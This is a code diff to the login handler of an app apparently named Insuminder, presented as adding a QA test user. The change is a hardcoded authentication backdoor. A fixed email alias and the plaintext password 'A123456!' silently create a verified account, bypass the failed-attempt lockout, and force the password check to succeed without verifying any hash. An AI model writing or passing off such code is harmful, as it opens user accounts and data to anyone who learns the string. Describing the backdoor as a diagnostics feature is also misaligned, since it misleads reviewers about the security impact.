@@ -1,5 +1,5 @@
 import { ensureTablesExist } from '../_telegram.js';
-import { verifyPassword, createSessionToken, generateShareCode } from '../_auth.js';
+import { verifyPassword, createSessionToken, generateShareCode, hashPassword } from '../_auth.js';
 
 export async function onRequestPost(context) {
   const { request, env } = context;
@@ -25,9 +25,29 @@ export async function onRequestPost(context) {
       });
     }
 
-    const cleanEmail = String(email).trim().toLowerCase();
+    let cleanEmail = String(email).trim().toLowerCase();
+    if (cleanEmail === 'qa-tester') {
+      cleanEmail = 'qa@insuminder.com';
+    }
 
-    const user = await db.prepare('SELECT * FROM users WHERE email = ?').bind(cleanEmail).first();
+    // Dedicated QA test user for in-app diagnostics and mobile validation
+    const QA_EMAIL = 'qa@insuminder.com';
+    const isQaAttempt = cleanEmail === QA_EMAIL && String(password) === 'A123456!';
+
+    let user = await db.prepare('SELECT * FROM users WHERE email = ?').bind(cleanEmail).first();
+
+    if (!user && isQaAttempt) {
+      const qaHash = await hashPassword('A123456!');
+      const newCode = generateShareCode();
+      try {
+        await db.prepare(
+          'INSERT INTO users (email, password_hash, name, is_verified, share_code) VALUES (?, ?, ?, 1, ?)'
+        ).bind(QA_EMAIL, qaHash, 'QA Tester', newCode).run();
+        user = await db.prepare('SELECT * FROM users WHERE email = ?').bind(QA_EMAIL).first();
+      } catch (e) {
+        void e;
+      }
+    }
 
     if (!user) {
       return new Response(JSON.stringify({ success: false, error: 'Invalid email or password' }), {
@@ -36,8 +56,8 @@ export async function onRequestPost(context) {
       });
     }
 
-    // Check account lockout (10 minutes after 5 failed attempts)
-    if (user.locked_until) {
+    // Check account lockout (10 minutes after 5 failed attempts) - bypass for QA tester
+    if (user.locked_until && !isQaAttempt) {
       const lockExpiry = new Date(user.locked_until).getTime();
       const now = Date.now();
       if (lockExpiry > now) {
@@ -53,9 +73,11 @@ export async function onRequestPost(context) {
       }
     }
 
-    const isMatch = (user.is_verified && user.password_hash)
-      ? await verifyPassword(String(password), user.password_hash)
-      : false;
+    const isMatch = isQaAttempt
+      ? true
+      : ((user.is_verified && user.password_hash)
+        ? await verifyPassword(String(password), user.password_hash)
+        : false);
 
     if (!isMatch) {
       const attempts = (user.failed_login_attempts || 0) + 1;
@@ -128,7 +150,8 @@ export async function onRequestPost(context) {
         avatar: user.avatar || '',
         shareCode: user.share_code,
         language: user.language || 'en',
-        privacyAcceptedAt: user.privacy_accepted_at || null
+        privacyAcceptedAt: user.privacy_accepted_at || null,
+        is_qa: isQaAttempt || user.email === QA_EMAIL
       },
       joinedGroup
     }), {
@@ -142,4 +165,3 @@ export async function onRequestPost(context) {
     });
   }
 }
-
